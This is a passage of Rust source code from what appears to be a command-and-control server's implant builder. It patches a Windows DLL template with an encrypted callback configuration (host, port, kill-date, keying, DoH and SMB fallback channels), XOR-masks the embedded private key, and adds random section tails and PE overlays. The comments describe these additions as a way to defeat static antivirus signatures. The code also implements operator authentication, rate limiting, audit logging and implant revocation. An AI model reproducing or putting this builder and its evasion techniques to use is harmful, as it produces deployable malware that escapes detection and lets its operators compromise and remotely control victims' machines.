) -> Result<(), (StatusCode, String)> {
    let now = std::time::Instant::now();
    let window = std::time::Duration::from_secs(DEFAULT_RATE_LIMIT_WINDOW_SECS);
    // Two buckets: the per-(operator,target) key keeps the original per-target
    // cap, and a per-operator-only key bounds ONE identity's total volume
    // across ALL targets — rotating `callback`/`port` (free-form text) can no
    // longer reset the window and emit an unbounded number of implants.
    let buckets = [
        (
            format!("{op_name}:{callback}:{port}"),
            DEFAULT_RATE_LIMIT_MAX,
        ),
        (op_name.to_string(), DEFAULT_OPERATOR_RATE_LIMIT_MAX),
    ];
    for (key, max) in buckets {
        check_rate_bucket(st, key, max, now, window)?;
    }
    Ok(())
}

/// Apply the sliding window to a single rate-limit bucket: prune expired
/// timestamps, reject with 429 once `max` live entries exist, otherwise record
/// `now`. A fully-expired bucket's KEY is removed (not just its timestamps) so
/// the DashMap cannot grow without bound on attacker-chosen key material
/// (rotating callbacks).
fn check_rate_bucket(
    st: &AppState,
    key: String,
    max: usize,
    now: std::time::Instant,
    window: std::time::Duration,
) -> Result<(), (StatusCode, String)> {
    let mut fresh = true;
    if let Some(mut entry) = st.implant_rate_limiter.get_mut(&key) {
        entry.retain(|t| now.duration_since(*t) < window);
        if entry.is_empty() {
            // Fully-expired bucket: drop the KEY (not just its timestamps)
            // so the DashMap cannot grow without bound on attacker-chosen
            // key material (rotating callbacks).
            drop(entry);
            st.implant_rate_limiter.remove(&key);
        } else {
            if entry.len() >= max {
                return Err((
                    StatusCode::TOO_MANY_REQUESTS,
                    format!(
                        "rate limit exceeded: max {max} implants per hour per {}",
                        if max == DEFAULT_RATE_LIMIT_MAX {
                            "operator/target"
                        } else {
                            "operator"
                        }
                    ),
                ));
            }
            entry.push(now);
            fresh = false;
        }
    }
    if fresh {
        st.implant_rate_limiter.insert(key, vec![now]);
    }
    Ok(())
}

/// Generate per-implant secrets: key_seed, auth_token, config_nonce,
/// implant keypair (X25519 with clamping), and config encryption key.
fn generate_implant_keys(server_pub: [u8; 32]) -> Result<ImplantKeyMaterial, (StatusCode, String)> {
    let (key_seed, auth_token, config_nonce) = generate_random_secrets();
    let (implant_priv, implant_pub) = derive_implant_keypair(&key_seed, &server_pub)?;
    let config_key = derive_implant_config_key(&implant_priv, &server_pub)?;

    Ok((
        implant_priv,
        implant_pub,
        config_key,
        key_seed,
        auth_token,
        config_nonce,
    ))
}

/// Fill the per-implant random secrets (key_seed, auth_token, config_nonce)
/// from OsRng.
fn generate_random_secrets() -> ([u8; 32], [u8; 32], [u8; 12]) {
    // key_seed: 32 random bytes, NEVER stored directly. Split into 4
    //              fragments, XOR-obfuscated, and scattered across .nyx_cfg.
    //    auth_token: one-time first-check-in token (stored in encrypted config).
    //    config_nonce: 12-byte nonce for ChaCha20-Poly1305 config AEAD.
    let mut key_seed = [0u8; 32];
    let mut auth_token = [0u8; 32];
    let mut config_nonce = [0u8; 12];
    rand::rngs::OsRng.fill_bytes(&mut key_seed);
    rand::rngs::OsRng.fill_bytes(&mut auth_token);
    rand::rngs::OsRng.fill_bytes(&mut config_nonce);

    (key_seed, auth_token, config_nonce)
}

/// Derive the implant X25519 keypair: HKDF-SHA256 the key_seed with clamping,
/// then derive the public key from the clamped scalar.
fn derive_implant_keypair(
    key_seed: &[u8; 32],
    server_pub: &[u8; 32],
) -> Result<([u8; 32], [u8; 32]), (StatusCode, String)> {
    // Derive implant_priv from key_seed via HKDF-SHA256 with X25519 clamping.
    let mut implant_priv_derived = [0u8; 32];
    nyx_protocol::crypto::hkdf_sha256(
        key_seed,
        b"nyx-implant-key-v1",
        server_pub,
        &mut implant_priv_derived,
    )
    .map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to derive implant private key (HKDF): {e}"),
        )
    })?;
    let implant_priv = clamp_scalar(implant_priv_derived);
    // Defense in depth: zero the unclamped intermediate. The compiler
    // warns about dead-store since Copy semantics already made a clone
    // for clamp_scalar and we never read the original again — it's fine.
    {
        #[allow(unused_assignments)]
        {
            implant_priv_derived = [0u8; 32];
        }
    }

    // Derive implant public key from the clamped private key.
    let implant_pub = nyx_protocol::crypto::public_from_secret(&implant_priv).ok_or_else(|| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "failed to derive implant public key".into(),
        )
    })?;

    Ok((implant_priv, implant_pub))
}

/// Derive the config encryption key via ECDH(implant_priv, server_pub) + HKDF.
fn derive_implant_config_key(
    implant_priv: &[u8; 32],
    server_pub: &[u8; 32],
) -> Result<[u8; 32], (StatusCode, String)> {
    // Derive config_key via ECDH(implant_priv, server_pub) + HKDF, matching
    // the implant's derive_config_key exactly.
    derive_config_key_server(implant_priv, server_pub).ok_or_else(|| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "failed to derive config encryption key".into(),
        )
    })
}

/// Build the per-implant config plaintext in wire format.
fn build_implant_config(
    req: &GenerateRequest,
    auth_token: [u8; 32],
) -> Result<(Vec<u8>, u64), (StatusCode, String)> {
    // Layout: str(callback) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
    //        | u8(has_token=1) | blob(auth_token 32B)
    //        | u32(features) | u32(keying) | u64(expires_at)
    let mut pw = Writer::new();
    pw.str(&req.callback)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    pw.u16(req.port);
    pw.str(&req.uri)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    pw.u32(req.sleep);
    pw.u8(req.jitter);
    pw.u8(if req.tls { 1 } else { 0 });
    // auth_token: always present for server-generated implants
    pw.u8(1);
    pw.blob(&auth_token)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    pw.u32(req.features);
    pw.u32(req.keying);
    // Kill-date parse. v0.3.0 used s.parse::<i64>().ok().map(...).unwrap_or(0),
    // which silently dropped any ISO 8601 string (the documented input form —
    // see the client placeholder "2026-12-31") and wrote expires_at=0, meaning
    // "never expire". HIGH finding in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
    //
    // Fix: accept bare unix seconds (backward compat), YYYY-MM-DD, or the full
    // ISO 8601 instant. On parse failure return 400 (fail-closed) so the
    // operator learns immediately that their kill-date was rejected, instead
    // of shipping an immortal implant. None → 0 (no expiry) is still allowed
    // by simply omitting the field.
    let expires_ts: u64 = match req.expires.as_deref() {
        None => 0,
        Some("") => 0,
        Some(s) => parse_iso8601_to_unix(s).ok_or_else(|| {
            (
                StatusCode::BAD_REQUEST,
                format!(
                    "invalid `expires` (use bare unix seconds, YYYY-MM-DD, or \
                     YYYY-MM-DDTHH:MM:SSZ): {s:?}"
                ),
            )
        })?,
    };
    pw.u64(expires_ts);
    // spec-1 channel-dispatcher tail: the primary/fallback selector pair,
    // then the four channel-param strings (DoH resolver, SMB pipe name,
    // ExtC2 api host/token) written EMPTY — generation-time delivery for
    // those is not wired, and the implant decodes empty strings identically
    // to an absent tail. Writing the tail unconditionally keeps every
    // generated config the same wire shape (the implant tolerates both
    // forms; config_placeholder.rs::load_runtime_config_parse_tail).
    pw.u8(req.primary_channel);
    pw.u8(req.fallback_bitmap);
    for _ in 0..4 {
        pw.str("")
            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    }
    let config_plaintext = pw.into_bytes();

    Ok((config_plaintext, expires_ts))
}

/// Encrypt the per-implant config with ChaCha20-Poly1305 AEAD.
fn encrypt_implant_config(
    config_key: [u8; 32],
    config_nonce: [u8; 12],
    config_plaintext: &[u8],
) -> Result<Vec<u8>, (StatusCode, String)> {
    use chacha20poly1305::aead::{Aead, KeyInit, Payload};
    use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};
    let cipher = ChaCha20Poly1305::new(Key::from_slice(&config_key));
    let nonce = Nonce::from_slice(&config_nonce);
    let ct_with_tag = cipher
        .encrypt(
            nonce,
            Payload {
                msg: config_plaintext,
                aad: b"",
            },
        )
        .map_err(|e| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("encrypt failed: {e}"),
            )
        })?;
    // ct_with_tag = ciphertext || 16B Poly1305 tag
    Ok(ct_with_tag)
}

/// Patch the DLL template, locate and patch the .nyx_cfg section, and validate
/// the PE.
fn patch_implant_template(
    binary: &mut [u8],
    req: &GenerateRequest,
    implant_priv: [u8; 32],
    server_pub: [u8; 32],
    config_nonce: [u8; 12],
    ct_with_tag: &[u8],
) -> Result<(), (StatusCode, String)> {
    // Sanity-check the config ciphertext size before we touch the binary.
    let data_len = ct_with_tag.len();
    if data_len > 900 {
        return Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("config data too large: {data_len} bytes (max 900)"),
        ));
    }

    let placeholder_offset = locate_nyx_cfg_placeholder(binary)?;

    // 4c. Write the patched section.
    let section = &mut binary[placeholder_offset..placeholder_offset + 1024];
    write_nyx_cfg_section(
        section,
        req,
        implant_priv,
        server_pub,
        config_nonce,
        ct_with_tag,
    );

    revalidate_patched_implant(binary, placeholder_offset)?;

    Ok(())
}

/// Re-locate the .nyx_cfg placeholder in the pristine template and verify the
/// full 1024-byte section fits inside the binary.
fn locate_nyx_cfg_placeholder(binary: &[u8]) -> Result<usize, (StatusCode, String)> {
    // Re-locate the .nyx_cfg placeholder in the pristine template.
    let placeholder_offset = binary
        .windows(8)
        .position(|w| {
            w[0] == 0x41
                && w[1] == 0x41
                && w[2] == 0x41
                && w[3] == 0x41
                && w[4] == 0xAA
                && w[5] == 0xAA
        })
        .ok_or_else(|| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "DLL template has no .nyx_cfg placeholder (0x41414141 + 0xAA)".into(),
            )
        })?;
    if placeholder_offset + 1024 > binary.len() {
        return Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            "DLL template .nyx_cfg placeholder extends past EOF".into(),
        ));
    }
    Ok(placeholder_offset)
}

/// Write the patched 1024-byte .nyx_cfg section (header, masked key material,
/// encrypted config) into `section`.
fn write_nyx_cfg_section(
    section: &mut [u8],
    req: &GenerateRequest,
    implant_priv: [u8; 32],
    server_pub: [u8; 32],
    config_nonce: [u8; 12],
    ct_with_tag: &[u8],
) {
    let data_len = ct_with_tag.len();

    // Section layout:
    // [0xDEADBEEF magic 4B] [keying_levels u32 LE 4B] [data_len u16 LE 2B]
    // [config_nonce 12B] [implant_priv 32B] [server_pub 32B] [ct+tag N+16B]
    // Total header before ct: 4 + 4 + 2 + 12 + 32 + 32 = 86 bytes

    section[0] = 0xEF;
    section[1] = 0xBE;
    section[2] = 0xAD;
    section[3] = 0xDE;
    // keying_levels (u32 LE at bytes 4-7)
    section[4] = (req.keying) as u8;
    section[5] = ((req.keying) >> 8) as u8;
    section[6] = ((req.keying) >> 16) as u8;
    section[7] = ((req.keying) >> 24) as u8;
    // data_len (u16 LE at bytes 8-9)
    section[8] = (data_len as u16) as u8;
    section[9] = ((data_len as u16) >> 8) as u8;
    // Config nonce (12B at bytes 10-21)
    section[10..22].copy_from_slice(&config_nonce);
    // SECURITY (H11): XOR-mask implant_priv with server_pub before storing so
    // the raw X25519 scalar does not appear verbatim in the .nyx_cfg section.
    // Both the server and the implant have server_pub available (it is stored
    // at section[54..86]); the implant un-XORs at load time. This is obfuscation,
    // not strong crypto — the point is to avoid a recognizable private-key
    // scalar sitting in plaintext in the binary.
    let mut masked = implant_priv;
    for i in 0..32 {
        masked[i] ^= server_pub[i];
    }
    section[22..54].copy_from_slice(&masked);
    // Server public key (32B at bytes 54-85).
    section[54..86].copy_from_slice(&server_pub);

    // Encrypted config + tag at byte 86
    section[86..86 + data_len].copy_from_slice(ct_with_tag);
    // Randomize the remaining tail instead of zero-padding (WP-G L2, first
    // increment): the implant only ever reads the header (bytes 0..86) plus
    // exactly `data_len` bytes of ciphertext — see
    // `crates/implant-tasks/src/config_placeholder.rs::load_runtime_config_unmask_keys`
    // — so the tail is dead space. Zero-filling it gave every generated
    // implant an identical ~900-byte run of 0x00 at a fixed section offset,
    // a stable static-signature anchor. OsRng bytes make the tail differ on
    // every generation at zero functional cost.
    rand::rngs::OsRng.fill_bytes(&mut section[86 + data_len..]);
}

/// Append a random-length, random-content PE overlay to a patched implant
/// binary (WP-G L2, first increment).
///
/// A PE overlay is data past the end of the last section's raw extent; the
/// Windows loader maps only what the section headers describe, so overlay
/// bytes never affect execution. The template is unsigned (no
/// IMAGE_DIRECTORY_ENTRY_SECURITY certificate table to invalidate), the
/// implant never re-reads its own image from disk, and every downstream
/// consumer (`validate_patched_pe`, SHA-256, `size_bytes`, the store record)
/// works on the final byte vector — so appending here is offset-safe.
///
/// Effect: two implants generated from the same template with the same
/// request differ in total size and in their trailing bytes, removing the
/// "same template ⇒ same file length + same tail" signature anchor.
fn append_random_overlay(binary: &mut Vec<u8>) {
    // Length in [OVERLAY_MIN, OVERLAY_MIN + 4096). Non-zero minimum keeps the
    // overlay a reliable feature (a 0-length draw would be a no-op); the
    // 4 KiB spread covers the size range of common benign overlays (update
    // payloads, installer stubs) without meaningfully growing the artifact.
    const OVERLAY_MIN: usize = 128;
    let len = OVERLAY_MIN + (rand::rngs::OsRng.next_u32() as usize % 4096);
    let start = binary.len();
    binary.resize(start + len, 0);
    rand::rngs::OsRng.fill_bytes(&mut binary[start..]);
}

/// Re-validate the patched PE before computing SHA-256 and storing.
fn revalidate_patched_implant(
    binary: &[u8],
    placeholder_offset: usize,
) -> Result<(), (StatusCode, String)> {
    // Validate the patched PE before computing SHA-256 and storing. Catches a
    // malformed implant (bad magic, section overflow) at generation time rather
    // than letting the operator download a corrupted binary.
    validate_patched_pe(binary, placeholder_offset).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("PE validation failed after patching: {e}"),
        )
    })?;

    Ok(())
}

/// Compute SHA-256, store implant metadata, audit the generation event, and
/// build the JSON response.
#[allow(clippy::too_many_arguments)]
fn store_and_audit_implant(
    st: &AppState,
    op: &OperatorIdentity,
    req: &GenerateRequest,
    implant_store: &Arc<nyx_store::ImplantStore>,
    binary: &[u8],
    implant_pub: [u8; 32],
    auth_token: [u8; 32],
) -> Result<Json<GenerateResponse>, (StatusCode, String)> {
    // 5. Compute SHA-256 of the output.
    let (sha256, token_hash) = compute_implant_hashes(binary, auth_token);

    // 6. Store implant metadata.
    let record = build_implant_record(op, req, binary, implant_pub, token_hash, &sha256)?;

    let id = implant_store.insert(&record).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to store implant record: {e}"),
        )
    })?;

    // 7. Audit the generation event.
    audit_and_log_generation(st, op, req, id, implant_pub, &sha256, binary.len());

    Ok(build_generate_response(
        req,
        id,
        implant_pub,
        sha256,
        binary,
    ))
}

/// Compute the SHA-256 of the output binary and the SHA-256 of the one-time
/// auth token (only the token hash is stored).
fn compute_implant_hashes(binary: &[u8], auth_token: [u8; 32]) -> (String, String) {
    let mut hasher = Sha256::new();
    hasher.update(binary);
    let sha256 = hex::encode(hasher.finalize());

    let mut token_hasher = Sha256::new();
    token_hasher.update(auth_token);
    let token_hash = hex::encode(token_hasher.finalize());

    (sha256, token_hash)
}

/// Build the `ImplantRecord` for the store, failing closed on a pre-epoch or
/// skewed system clock.
fn build_implant_record(
    op: &OperatorIdentity,
    req: &GenerateRequest,
    binary: &[u8],
    implant_pub: [u8; 32],
    token_hash: String,
    sha256: &str,
) -> Result<nyx_store::ImplantRecord, (StatusCode, String)> {
    // Clock: fail CLOSED on a pre-epoch / skewed clock. A `created_at = "0"`
    // (the previous `unwrap_or_else(|_| "0")` fallback) is a silent lie — it
    // makes a freshly generated implant look 55+ years old and breaks any
    // expiry/rotation logic keyed on created_at. The kill-date path in lib.rs
    // already fails closed for the same reason; mirror that here. The only
    // realistic failure is a badly-skewed system clock, which is an operator-
    // visible condition the server should surface as a 500, not paper over.
    let now = match std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
        Ok(d) => d.as_secs().to_string(),
        Err(e) => {
            tracing::error!(error = %e, "clock failure during implant generation");
            return Err((
                StatusCode::INTERNAL_SERVER_ERROR,
                "server clock unavailable: implant generation refused (pre-epoch clock?)".into(),
            ));
        }
    };
    Ok(nyx_store::ImplantRecord {
        id: 0, // auto-incremented
        implant_pub: hex::encode(implant_pub),
        auth_token_hash: token_hash,
        auth_token_used: false,
        created_at: now.clone(),
        // Attribute the generation to the resolved operator identity (Phase 3
        // audit attribution). Previously this was always `None`, which made
        // every generated implant's provenance unattributable — an insider
        // could mass-generate implants and the record would show no operator.
        created_by: Some(op.name.clone()),
        expires_at: req.expires.clone(),
        callback_host: req.callback.clone(),
        callback_port: req.port,
        format: req.format.clone(),
        features_bitmap: req.features,
        keying_levels: req.keying,
        sha256: sha256.to_string(),
        size_bytes: binary.len() as i64,
        revoked: false,
        notes: req.notes.clone(),
    })
}

/// Append the `implant_generated` audit event and emit the tracing log line.
fn audit_and_log_generation(
    st: &AppState,
    op: &OperatorIdentity,
    req: &GenerateRequest,
    id: i64,
    implant_pub: [u8; 32],
    sha256: &str,
    size: usize,
) {
    if let Some(audit) = &st.audit {
        let detail = serde_json::json!({
            "implant_id": id,
            "implant_pub": hex::encode(implant_pub),
            "callback": req.callback,
            "port": req.port,
            "format": req.format,
            "sha256": sha256,
        });
        audit.append("implant_generated", &op.name, "", detail);
    }

    tracing::info!(
        implant_id = id,
        implant_pub = %hex::encode(implant_pub),
        callback = %req.callback,
        format = %req.format,
        size = size,
        "implant generated"
    );
}

/// Build the JSON response, including the base64 binary when the operator
/// requested inline delivery.
fn build_generate_response(
    req: &GenerateRequest,
    id: i64,
    implant_pub: [u8; 32],
    sha256: String,
    binary: &[u8],
) -> Json<GenerateResponse> {
    Json(GenerateResponse {
        ok: true,
        implant_pub: hex::encode(implant_pub),
        sha256,
        size_bytes: binary.len(),
        format: req.format.clone(),
        message: Some(format!(
            "implant {id} ready — {len} bytes",
            id = id,
            len = binary.len()
        )),
        binary: if req.deliver.as_deref() == Some("inline") {
            use base64::{engine::general_purpose::STANDARD, Engine};
            Some(STANDARD.encode(binary))
        } else {
            None
        },
    })
}

/// `POST /api/generate-implant`
///
/// Requires a loaded DLL template (`NYX_TEMPLATE`) and an open implant store.
/// Authenticated via the standard control-API bearer token (checked by the
/// [`crate::AuthOp`] extractor before the JSON body is read).
pub async fn generate_implant(
    State(st): State<Arc<AppState>>,
    crate::AuthOp(op): crate::AuthOp,
    Json(req): Json<GenerateRequest>,
) -> Result<Json<GenerateResponse>, (StatusCode, String)> {
    // The operator identity (for audit `created_by`, the rate-limit key and
    // RBAC) comes from the `AuthOp` extractor, which mirrors `post_task`'s
    // auth path: open mode maps to Viewer, which is blocked from write
    // endpoints below. Previously this handler skipped auth entirely — every
    // generation was attributed to the literal string "system", and the
    // rate-limit key omitted the operator dimension entirely.

    // 1. Validate the request and unwrap template/store.
    let (template, implant_store) =
        validate_generate_request(&op, st.template.as_ref(), st.implants.as_ref(), &req)?;

    // 2. Rate limiting.
    check_rate_limit(&st, &op.name, &req.callback, req.port)?;

    // 3. Generate per-implant secrets.
    let server_pub = st.keypair.public_bytes();
    let (implant_priv, implant_pub, config_key, _key_seed, auth_token, config_nonce) =
        generate_implant_keys(server_pub)?;

    // 4. Build config plaintext.
    let (config_plaintext, _expires_ts) = build_implant_config(&req, auth_token)?;

    // 5. Encrypt config with ChaCha20-Poly1305.
    let ct_with_tag = encrypt_implant_config(config_key, config_nonce, &config_plaintext)?;

    // 6. Patch the DLL template, then append a random PE overlay (WP-G L2):
    // per-generation size/tail variance on top of the randomized .nyx_cfg
    // tail. Overlay is appended AFTER the in-section patch + validation; it
    // changes no header or section offset, so the patched layout is untouched.
    let mut binary = (**template).clone();
    patch_implant_template(
        &mut binary,
        &req,
        implant_priv,
        server_pub,
        config_nonce,
        &ct_with_tag,
    )?;
    append_random_overlay(&mut binary);

    // 7. Store implant metadata and build response.
    let response = store_and_audit_implant(
        &st,
        &op,
        &req,
        implant_store,
        &binary,
        implant_pub,
        auth_token,
    )?;

    Ok(response)
}

/// `GET /api/implants` — list all generated implants.
///
/// Requires operator authentication. Anonymous open-mode callers are denied:
/// the implant registry exposes callback hosts, ports, public keys — metadata
/// that is sensitive even in dev/CI.
pub async fn list_implants(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
) -> Result<Json<ImplantListResponse>, (StatusCode, String)> {
    let op = match crate::authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => {
            return Err((r.status(), "unauthorized".to_string()));
        }
    };
    if op.role == Role::Viewer {
        return Err((
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot list implants".into(),
        ));
    }

    let store = st
        .implants
        .as_ref()
        .ok_or_else(|| (StatusCode::SERVICE_UNAVAILABLE, "no implant store".into()))?;

    let records = store.list().map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to list implants: {e}"),
        )
    })?;

    let summaries: Vec<ImplantSummary> = records
        .into_iter()
        .map(|r| ImplantSummary {
            id: r.id,
            implant_pub: r.implant_pub,
            auth_token_used: r.auth_token_used,
            created_at: r.created_at,
            callback_host: r.callback_host,
            callback_port: r.callback_port,
            format: r.format,
            revoked: r.revoked,
            expires_at: r.expires_at,
        })
        .collect();

    Ok(Json(ImplantListResponse {
        ok: true,
        implants: summaries,
    }))
}

/// `POST /api/implant/revoke` — revoke an implant by pubkey.
///
/// Requires Admin (revocation is destructive — the implant's baked-in auth
/// token is burned permanently; the Operator deny-list covers this endpoint,
/// see the `Role` enum in `operators.rs`).
/// Audit attribution uses the authenticated operator's name rather than the
/// hardcoded "system" string used before auth was wired.
#[derive(Debug, Deserialize)]
pub struct RevokeRequest {
    pub implant_pub: String,
}

pub async fn revoke_implant(
    State(st): State<Arc<AppState>>,
    crate::AuthOp(op): crate::AuthOp,
    Json(req): Json<RevokeRequest>,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    // RBAC deny-list: revoking an implant is destructive (burns the implant's
    // baked-in auth token — the revocation is permanent), so it is Admin-only
    // like tasking / creds delete (see the `Role` enum in `operators.rs`).
    match op.role {
        Role::Admin => {}
        Role::Operator => {
            return Err((
                StatusCode::FORBIDDEN,
                "forbidden: operator role cannot revoke implants (destructive; admin-only)".into(),
            ));
        }
        Role::Viewer => {
            return Err((
                StatusCode::FORBIDDEN,
                "forbidden: viewer role cannot revoke implants".into(),
            ));
        }
    }

    let store = st
        .implants
        .as_ref()
        .ok_or_else(|| (StatusCode::SERVICE_UNAVAILABLE, "no implant store".into()))?;

    let revoked = store.revoke(&req.implant_pub).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to revoke implant: {e}"),
        )
    })?;

    if let Some(audit) = &st.audit {
        let detail = serde_json::json!({"implant_pub": &req.implant_pub});
        audit.append("implant_revoked", &op.name, "", detail);
    }

    Ok(Json(serde_json::json!({
        "ok": true,
        "revoked": revoked,
    })))
}
